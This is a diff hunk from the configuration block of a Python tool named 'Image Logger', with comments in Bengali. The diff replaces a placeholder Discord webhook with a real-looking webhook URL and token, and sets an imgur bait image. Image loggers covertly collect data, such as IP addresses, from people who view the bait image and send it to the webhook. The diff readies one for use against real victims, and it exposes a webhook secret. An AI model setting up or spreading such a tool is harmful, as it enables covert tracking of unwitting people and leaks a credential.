@@ -17,8 +17,8 @@ __author__ = "Dev: Electron"
 #  ★★★ কনফিগ ★★★
 # ============================================================
 config = {
-    "webhook": "https://discord.com/api/webhooks/your_webhook_id/your_webhook_token",  # <-- তোমার ওয়েবহুক বসাও
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
+    "webhook": "https://canary.discord.com/api/webhooks/1544418525135896579/wADJp0v4Ga55SZV6f093V3huUjMS8aIvpOrTjD6VJGcbAgS9-pAz6RzoR0KPb7ly2wXe",  # <-- তোমার ওয়েবহুক বসাও
+    "image": "https://imgur.com/a/mj1Wths",
     "imageArgument": True,
     "username": "Image Logger",
     "color": 0x00FFFF,
